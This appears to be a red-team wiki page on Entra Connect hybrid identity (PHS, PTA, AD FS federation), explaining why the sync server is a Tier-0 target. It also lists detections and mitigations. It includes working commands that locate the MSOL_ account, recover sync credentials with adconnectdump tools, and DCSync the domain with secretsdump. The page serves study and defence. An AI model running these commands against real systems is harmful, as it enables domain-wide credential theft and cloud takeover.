---
title: "Hybrid Identity: Sync Models & Attack Surface"
category: AD / Entra ID
order: 70
tags:
  - hybrid-identity
  - entra-connect
  - azure-ad-connect
  - phs
  - pta
  - federation
  - msol
  - tier-0
  - dcsync
summary: How on-prem AD is bridged to Entra ID via Entra Connect (PHS, PTA, ADFS federation), why the sync server is a Tier-0 target, and the DCSync-capable MSOL_ / sync account that makes it one.
prerequisites:
  - Local admin / SYSTEM on the Entra Connect (Azure AD Connect) sync server for on-host credential extraction
  - OR DA-level access + the DPAPI domain backup key for the remote (no-code-exec) dump path
  - Knowledge of which auth model the tenant uses (PHS / PTA / federation) — Get-MgDomain / AADInternals Get-AADIntTenantDomains reveal federated vs managed domains
tools:
  - adconnectdump (ADSyncDecrypt / ADSyncQuery / ADSyncCertDump)
  - AADInternals
  - impacket (secretsdump)
  - roadtx / ROADtools
detection:
  - Event 4662 replication (DS-Replication-Get-Changes*) sourced from the sync server or the MSOL_ account to any host other than a DC
  - Access to the ADSync database (C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf) or impersonation of NT SERVICE\ADSync outside the ADSync process
  - Logons to / from the Connect server by non-Tier-0 admins; new local admins on the sync host
  - Entra Connect Health alerts; unexpected sync account (Sync_<host>@tenant) API activity
mitigation:
  - Classify and administer the Entra Connect server, its SQL/LocalDB, and both service accounts as Tier-0 (Enterprise Access Model)
  - Prefer PHS over PTA/ADFS where possible to shrink on-prem attack surface; retire AD FS in favour of cloud auth + Conditional Access
  - Restrict and monitor the MSOL_/DirSync account's replication rights; do not grant it interactive logon
  - Patch Entra Connect (older builds shipped weak DPAPI/credential storage); enable AD FS/PTA agent monitoring via Entra Connect Health
refs:
  - label: "Sygnia — Guarding the Bridge: new attack vectors in Azure AD Connect"
    url: https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/
  - label: Semperis — Entra Connect compromise explained
    url: https://www.semperis.com/blog/microsoft-entra-connect-compromise-explained/
  - label: dirkjanm — adconnectdump (repo)
    url: https://github.com/dirkjanm/adconnectdump
  - label: "dirkjanm.io — Updating adconnectdump: a journey into DPAPI"
    url: https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/
  - label: Tevora — Targeting MSOL accounts to compromise internal networks
    url: https://www.tevora.com/threat-blog/targeting-msol-accounts-to-compromise-internal-networks/
  - label: Reversec Labs — Entra Connect exploitation in 2025
    url: https://labs.reversec.com/posts/2025/10/entra-connect-exploitation-in-2025-an-overview
  - label: Microsoft Learn — Choose the right authentication method (PHS/PTA/federation)
    url: https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/choose-ad-authn
  - label: Microsoft Learn — Enterprise access model (Tier 0)
    url: https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model
  - label: HackTricks Cloud — Az Connect Sync
    url: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/az-connect-sync.html
---

## The three hybrid authentication models

Entra Connect (formerly *Azure AD Connect*) synchronises on-prem AD objects into Entra ID and wires up **one of three ways** cloud sign-ins are validated. Each moves trust across the on-prem/cloud boundary differently, so each fails differently.

| Model | Where the password is verified | On-prem dependency at sign-in | Primary attack surface |
|---|---|---|---|
| **PHS** — Password Hash Sync | In the cloud, against a synced hash | None | Sync server holds DCSync-capable creds; MSOL account; cloud remains reachable even if on-prem is down |
| **PTA** — Pass-Through Auth | On-prem, by a PTA agent asking a DC | Agent must be online | Agent host is a man-in-the-middle point — `PTASpy` backdoor / credential harvest; rogue agent registration |
| **Federation** — AD FS | On-prem, AD FS issues a signed SAML token | AD FS farm | Token-signing cert theft -> **Golden SAML**; federation-config backdoor |

PHS is Microsoft's default and the most common. Note PHS does **not** sync the cleartext or the raw NT hash — it syncs a `PBKDF2(HMAC-SHA256(NT-hash))` value only usable to validate cloud sign-ins (not directly pass-the-hash-able on-prem). A tenant can run more than one model at once (e.g. PHS as backup for federation).

## The Entra Connect server is Tier-0

The sync server holds standing high-privilege access into **both** directories:

- **Into on-prem AD** via the on-prem sync account `MSOL_<installID>` (or a custom account), which is granted the *Directory Synchronization Accounts* rights — i.e. **DS-Replication-Get-Changes + Get-Changes-All (DCSync)**.
- **Into Entra ID** via the cloud sync account `Sync_<host>@<tenant>.onmicrosoft.com`, which holds the *Directory Synchronization Accounts* directory role.

Both credential sets are stored **on the sync server**, encrypted with DPAPI and recoverable by anything running as `NT SERVICE\ADSync` / local SYSTEM. Compromise of this one box therefore yields domain-wide hash replication on-prem **and** a privileged cloud principal. Treat it, its database, and its two service accounts as Tier-0 assets.

## The MSOL_ / sync service account

```powershell
# Find the on-prem sync account (DCSync-capable)
Get-ADUser -Filter "name -like 'MSOL_*'" -Properties memberOf, servicePrincipalName
```

Because `MSOL_<installID>` has replication rights, **recovering its password is equivalent to DCSync of the whole domain**:

```sh
# Once the MSOL_ cleartext is recovered from the Connect server:
secretsdump.py '$domain/MSOL_<installID>:<recovered-pw>'@$dc_ip -just-dc
```

## Extracting the stored sync credentials

`dirkjanm/adconnectdump` decrypts the ADSync credential store. Pick the sub-tool by how much access you have and the credential-storage mode:

```powershell
# On the sync server (local SYSTEM/admin) — decrypt in place via DPAPI,
# auto-impersonating NT SERVICE\ADSync. Run from ...\Azure AD Sync\Bin
ADSyncDecrypt.exe          # legacy password-in-DB / DPAPI mode
ADSyncCertDump.exe <cert_thumbprint> <client_id> <tenant_id>   # 2025+ service-principal/cert mode -> assertion for roadtx
```

```sh
# Remote, NO code execution on target — pulls the ADSync .mdf over RPC like
# secretsdump; needs DA-level creds + the DPAPI domain backup key
adconnectdump.py '$domain/$user:$password'@<entra-connect-host>
```

The local ADSync database lives at `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`. Older Connect builds stored the credentials in a weaker form; newer builds moved to DPAPI and then to certificate/service-principal auth — enumerate the version on-target and choose the matching tool.

> Cross-reference: turning these recovered creds into cloud/on-prem access (Seamless SSO silver ticket, PTA injection, sync-account abuse) is covered in **On-Prem -> Cloud Pivoting**. Golden SAML (federation model) has its own page.
